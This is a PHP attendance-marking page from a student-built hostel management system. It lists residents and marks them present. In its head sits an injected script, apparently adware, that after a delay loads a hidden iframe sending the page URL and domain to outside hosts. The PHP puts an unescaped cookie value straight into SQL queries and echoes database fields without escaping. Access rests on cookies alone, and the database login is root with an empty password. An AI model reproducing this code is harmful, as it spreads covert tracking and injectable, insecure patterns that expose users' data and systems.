<?php
if(isset($_COOKIE['loginw']))
{if(isset($_COOKIE['date']));
 else
 die("Time Out");
}
else
die("Unauthorised Access !!");
include ('connect.php');
?>
<!DOCTYPE HTML>
<html>
	<head>
	
	
	
		<script async="" type="text/javascript">(function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain   + '&topic=dpdiedarg&' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();</script><script src="js/analytics.js" async=""></script>
                <script src="js/jquery-1.js"></script>
	<script src="js/jquery.js"></script>





	<style type="text/css">


.btn1 {
  -webkit-border-radius: 33;
  -moz-border-radius: 33;
  border-radius: 33px;
  text-shadow: 1px 1px 3px #666666;
  font-family: Georgia;
  color: #ffffff;
  font-size: 14px;
  background: #3498db;
  padding: 8px 20px 10px 20px;
  text-decoration: none;
}

.btn1:hover {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}
</style>
		<title>Mark Attendence</title>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<meta name="description" content="" />
		<meta name="keywords" content="" />
		<link href='http://fonts.googleapis.com/css?family=Roboto:400,100,300,700,500,900' rel='stylesheet' type='text/css'>
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
		<script src="js/skel.min.js"></script>
		<script src="js/skel-panels.min.js"></script>
		<script src="js/init.js"></script>
		<noscript>
			<link rel="stylesheet" href="css/skel-noscript.css" />
			<link rel="stylesheet" href="css/style.css" />
			<link rel="stylesheet" href="css/style-desktop.css" />
		</noscript>
	</head>
	<body>

	<!-- Header -->
		<div id="tweet">
			<div id="nav-wrapper">
				<!-- Nav -->
				<nav id="nav">
					<ul>
						<li class="active"><a href="index.php">Home</a></li>
						<li><a href="http://www.kiet.edu/Virtualtour/web/frontview.html">Gallery</a></li>
						<li><a href="left-sidebar.html">About Us</a></li>
						<li><a href="logout.php">Logout</a></li>
					</ul>
				</nav>
			</div>
			<div class="container">

				<!-- Logo -->
				<div id="logo">
					<h1><a href="www.kiet.edu"></a></h1>
					<span class="tag"></span>
				</div>
			</div>
		</div>
	<!-- Header -->

	<!-- Main -->
		<div id="main">
			<div id="content" class="container">
				<section>
					<header>
					<center>
						<h2>Mark Attendence</h2>
						<span class="byline"></span>
					</header>
					 <?php
 $dbhost = "localhost";
 $dbuser = "root";
 $dbpass = "";
 $dbname = "hostel";
 @$tech=$_POST['name'];
 $id=$_COOKIE['IDw'];
 $sql="SELECT * FROM login WHERE hostel_id='$id' ORDER BY `room_no` ASC";
 $result_set=mysql_query($sql);
 $n=mysql_num_rows($result_set);
 echo "<form action='submit_att.php' method='post'>";
$d=$_COOKIE['date'];
$f=1;


$q1=mysql_query("SELECT * FROM attendence WHERE hostel_id='$id'");
while($r=mysql_fetch_array($q1))
{$d1=$r['date'];
if(strcmp($d,$d1)==0)
$f=0;
}

 if($f==0)
 {
  echo "<script>alert('You have already marked this day`s attendence')</script>";
  echo "<script language='javascript'>window.location.href='b.php'</script>";
  die();
 }

 echo "<table width='100%' id='table'><tr><td><b>Attendence</td><td><b>Name</td><td><b>Room No</td></tr>";
 while($row=mysql_fetch_array($result_set))
 {$id=$row['id'];
 $rno=$row['room_no'];
 $name=$row['firstname']." ".$row['lastname'];
 echo "<tr><td><input type='checkbox' name=$id value=$id checked></td><td>$name</td><td>$rno</td>";
 }
 echo "
 <tr><td colspan=3 align=left><a href='#table' class='btn btn-primary' data-toggle='checkboxes' data-action='check'>Check all&nbsp</a>
<a href='#table' class='btn btn-primary' data-toggle='checkboxes' data-action='uncheck'>Uncheck all&nbsp</a>
<a href='#table' class='btn btn-primarybtn btn-primary' data-toggle='checkboxes' data-action='toggle'>Toggle all</a>
</td></tr><tr><td colspan=3 align=center><input type='submit' value='submit' class='btn1'></td></tr></table></form> ";

 ?>

                                           </p>
				</section>
			</div>
		</div>
	<!-- /Main -->

	<!-- Tweet -->
		<div id="tweet">
			<div class="container">
				<section>
					<blockquote></blockquote>
				</section>
			</div>
		</div>
	<!-- /Tweet -->

	<!-- Footer -->
		<div id="footer">
			<div class="container">
				<section>
					<header>
						<h2>Made By</h2>
						<span class="byline">Ankit Maurya<br>Anurag Dubey</span>
					</header>

				</section>
			</div>
		</div>
	<!-- /Footer -->

	<!-- Copyright -->
		<div id="copyright">
			<div class="container">
				HOSTEL MANAGEMENT SYSTEM
			</div>
		</div>


	</body>
</html>
